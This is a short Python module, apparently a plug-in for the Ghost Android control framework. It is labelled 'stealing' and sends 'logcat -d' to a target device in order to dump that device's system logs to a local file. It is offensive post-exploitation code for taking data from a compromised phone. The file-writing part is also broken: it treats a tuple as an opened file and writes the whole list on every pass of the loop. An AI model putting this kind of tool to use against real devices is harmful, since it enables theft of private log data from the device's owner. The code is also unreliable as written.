#!/usr/bin/env python3

# Valentin Lobstein 2022
# Default Project : https://github.com/EntySec/Ghost

from beautifultable import BeautifulTable
from termcolor import colored
from core.badges import badges
from core.ghost import ghost

class GhostModule:
    def __init__(self):
        self.badges = badges()
        self.ghost = ghost()

        self.name = "log"
        self.description = "Show logs from target system."
        self.usage = "Usage: log <output_name>"
        self.type = "stealing"
        self.args = 2

    def run(self, cmd_data): 
        result = self.ghost.send_command("shell","logcat -d")
        result = list(result)
        with ("w",str(cmd_data.split(" ")[0])) as output:
            for letter in result:
                output.write(result)
        print(self.badges.G + f"Dumped Logs on {cmd_data.split(' ')[0]}..")
            